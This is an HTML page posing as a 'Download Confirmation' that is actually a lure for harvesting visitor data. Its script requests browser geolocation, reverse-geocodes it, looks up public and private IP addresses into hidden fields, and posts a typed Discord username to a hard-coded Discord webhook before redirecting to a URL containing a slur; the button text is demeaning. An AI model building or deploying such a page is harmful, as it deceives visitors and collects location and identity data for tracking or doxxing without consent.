<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>project</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #2c2f33;
      color: #fff;
    }

    .container {
      text-align: center;
      background: rgba(35, 39, 42, 0.9);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
      width: 300px;
    }

    button {
      padding: 10px 20px;
      margin: 10px;
      border: none;
      border-radius: 5px;
      background-color: #7289da;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #5b6eae;
    }

    #status {
      margin-top: 15px;
    }

    /* Add hidden input fields for IP addresses */
    #public_ip, #private_ip {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Download Confirmation</h1>
    <p>Click Allow so we can bring you to the download.</p>
    <button onclick="getLocation()">Allow</button>
    <button>Don't Allow</button>
    <p id="status"></p>

    <!-- Add hidden input fields for IP addresses -->
    <input type="hidden" id="public_ip">
    <input type="hidden" id="private_ip">

    <!-- Add form for Discord username -->
    <form id="discord-form">
      <label for="discord-username">Enter your Discord username:</label>
      <input type="text" id="discord-username" required>
      <button onclick="sendDiscordUsername()">Good Boy</button>
    </form>
  </div>

  <script>
    // Fetch the user's location data using the Geolocation API
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;

            // Fetch the user's location data using OpenCage Geocoder API
            fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat},${lng}&key=YOUR_API_KEY&pretty=1`)
              .then(response => response.json())
              .then(data => {
                const formattedAddress = data.results[0].formatted;
                const publicIp = document.getElementById("public_ip");
                const privateIp = document.getElementById("private_ip");

                // Fetch the user's public IP address
                fetch("https://api.ipify.org?format=json")
                  .then(response => response.json())
                  .then(data => {
                    publicIp.value = data.ip;
                  });

                // Fetch the user's private IP address (requires server-side script)
                // This example assumes you have a server-side script that returns the user's private IP address
                fetch("/get-private-ip")
                  .then(response => response.text())
                  .then(data => {
                    privateIp.value = data;
                  });

                // Display the location data on the web page
                document.getElementById("status").innerHTML = `Your location: ${formattedAddress}`;
              });
          },
          function() {
            document.getElementById("status").innerHTML = "Unable to retrieve your location.";
          }
        );
      } else {
        document.getElementById("status").innerHTML = "Geolocation is not supported by your browser.";
      }
    }

    // Send the user's Discord username to the Discord webhook
    function sendDiscordUsername() {
      const discordUsername = document.getElementById("discord-username").value;
      const discordWebhookUrl = "https://discordapp.com/api/webhooks/1337676565290553344/3SC7HaMd2fmvJbjUFjBSZLzZXyMcqyi1tRfIaXu2UhbZeTUFhiw2GpP8l1BKjAZsy8NQ";

      // Send the Discord username to the webhook
      fetch(discordWebhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: `New user: ${discordUsername}` })
      })
        .then(() => {
          // Redirect the user to the specified URL
          window.location.href = "https://niggafart.com";
        })
        .catch(error => {
          console.error("Error sending Discord webhook:", error);
        });
    }
  </script>
</body>
</html>
